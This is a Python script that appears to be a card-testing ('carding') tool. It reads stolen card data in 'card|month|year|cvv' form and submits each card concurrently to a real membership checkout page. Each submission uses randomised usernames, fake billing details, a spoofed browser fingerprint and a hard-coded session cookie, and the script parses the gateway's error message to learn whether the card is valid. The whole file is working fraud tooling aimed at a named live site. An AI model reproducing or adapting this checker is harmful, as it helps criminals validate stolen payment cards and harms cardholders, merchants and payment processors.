import asyncio
import traceback
from httpx import AsyncClient
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import random
import string
# def generate_random_useragent():
#     # Create an instance of UserAgent
#     ua = UserAgent()

#     # Generate a random User-Agent
#     random_useragent = ua.random
#     return random_useragent
import random
import string

def generate_random_username(length=10):
    # Define the character set: uppercase, lowercase, and digits
    characters = string.ascii_letters + string.digits  # Includes A-Z, a-z, and 0-9
    
    # Generate a random username of the specified length
    username = ''.join(random.choices(characters, k=length))
    
    return username

import requests
import random


def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None
            

async def chkk(fullz, session):
    """Check a single credit card."""
    try:
        cc, mes, ano, cvv = fullz.split("|")
        
        # if len(ano) == 2:
        #     ano = "20" + ano  # Extract the last two characters   

        mes = mes.zfill(2)
        
        ua = UserAgent()

        # Generate a random User-Agent
        random_useragent = ua.random

    # Define the character set: uppercase, lowercase, and digits
        random_username = generate_random_username(10)
    # return random_useragent
        

        import requests
        cookies = {
    'PHPSESSID': '55661ed8603e1c7f07699ed2e0e59a66',
    'pmpro_visit': '1',
    '_gid': 'GA1.2.996382946.1738749805',
    '_gat': '1',
    '_ga_FCQFFNVQTB': 'GS1.1.1738749805.1.0.1738749805.60.0.0',
    '_ga': 'GA1.1.1453995652.1738749805',
    '_uetsid': '712a0000e3a811efb6922949c447a7a1',
    '_uetvid': '712a1dd0e3a811ef96d325f726b6eb24',
}

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=55661ed8603e1c7f07699ed2e0e59a66; pmpro_visit=1; _gid=GA1.2.996382946.1738749805; _gat=1; _ga_FCQFFNVQTB=GS1.1.1738749805.1.0.1738749805.60.0.0; _ga=GA1.1.1453995652.1738749805; _uetsid=712a0000e3a811efb6922949c447a7a1; _uetvid=712a1dd0e3a811ef96d325f726b6eb24',
            'origin': 'https://forms.legal',
            'priority': 'u=0, i',
            'referer': 'https://forms.legal/membership-account/membership-checkout/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        }

        payload = {
    'pmpro_level': '1',
    'checkjavascript': '1',
    'username': random_username,
    'password': 'ghjgh@jh.com',
    'password2': 'ghjgh@jh.com',
    'bemail': f'{random_username}@jh.com',
    'bconfirmemail': f'{random_username}@jh.com',
    'fullname': '',
    'gateway': 'authorizenet',
    'bfirstname': 'dsfg',
    'blastname': 'sfdg',
    'baddress1': 'new york',
    'baddress2': '',
    'bcountry': 'US',
    'bcity': 'new york',
    'bstate': 'NY',
    'bzipcode': '10080',
    'bphone': '',
    'CardType': 'Visa',
    'AccountNumber': cc,
    'ExpirationMonth': mes,
    'ExpirationYear': ano,
    'CVV': cvv,
    'tos': '1',
    'pmpro_checkout_nonce': '908b1c6977',
    '_wp_http_referer': '/membership-account/membership-checkout/',
    'submit-checkout': '1',
    'javascriptok': '1',
}

        response = await session.post(
            'https://forms.legal/membership-account/membership-checkout/',
            cookies=cookies,
            headers=headers,
            data=payload,
        )
        # print(response.text)
        res=gets(response.text, '<div role="alert" id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')
        print(res)

        return response.text

    except Exception:
        print("Error occurred:", traceback.format_exc())
        return {"error": "Failed to process"}

async def process_chunk(cards_chunk, concurrency=2):
    """Process a chunk of cards with high concurrency."""
    semaphore = asyncio.Semaphore(concurrency)

    async with AsyncClient() as session:
        async def safe_check(card):
            async with semaphore:
                return await chkk(card, session)

        tasks = [safe_check(card) for card in cards_chunk]
        return await asyncio.gather(*tasks, return_exceptions=True)

def split_into_chunks(data, chunk_size):
    """Split data into smaller chunks for parallel processing."""
    for i in range(0, len(data), chunk_size):
        yield data[i:i + chunk_size]

def run_batches(cards, batch_size=2):
    """Run batches of card checks in parallel."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    chunks = list(split_into_chunks(cards, batch_size))
    results = loop.run_until_complete(asyncio.gather(*(process_chunk(chunk) for chunk in chunks)))
    loop.close()
    return results
